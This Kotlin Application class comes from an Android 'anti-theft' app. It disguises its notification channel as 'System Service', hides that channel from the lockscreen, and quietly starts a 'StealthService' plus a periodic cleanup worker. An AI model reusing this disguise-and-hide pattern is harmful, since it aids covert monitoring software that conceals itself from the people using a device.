package com.antitheft.app

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.work.*
import com.antitheft.app.managers.*
import com.antitheft.app.services.StealthService
import com.antitheft.app.utils.Constants
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit

class AntiTheftApplication : Application() {
    
    private lateinit var dataLifecycleManager: DataLifecycleManager
    private lateinit var customCommandManager: CustomCommandManager
    private val applicationScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        initializeManagers()
        setupPeriodicTasks()
        
        val prefs = getSharedPreferences(Constants.PREF_NAME, Context.MODE_PRIVATE)
        if (!prefs.getBoolean(Constants.PREF_FIRST_RUN, true)) {
            applicationScope.launch {
                delay(5000)
                startStealthServices()
            }
        } else {
            prefs.edit().putBoolean(Constants.PREF_FIRST_RUN, false).apply()
        }
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                Constants.NOTIFICATION_CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }
    
    private fun initializeManagers() {
        dataLifecycleManager = DataLifecycleManager(this)
        customCommandManager = CustomCommandManager(this)
    }
    
    private fun setupPeriodicTasks() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(true)
            .build()
        
        val periodicWork = PeriodicWorkRequestBuilder<MaintenanceWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints).addTag("maintenance").build()
        
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "maintenance_work", ExistingPeriodicWorkPolicy.KEEP, periodicWork
        )
    }
    
    private fun startStealthServices() {
        val intent = android.content.Intent(this, StealthService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
        else startService(intent)
    }
    
    override fun onTerminate() {
        super.onTerminate()
        applicationScope.cancel()
    }
}

class MaintenanceWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result {
        return try {
            val cleanupManager = CleanupManager(applicationContext)
            cleanupManager.performAutomaticCleanup()
            Result.success()
        } catch (e: Exception) { Result.retry() }
    }
}
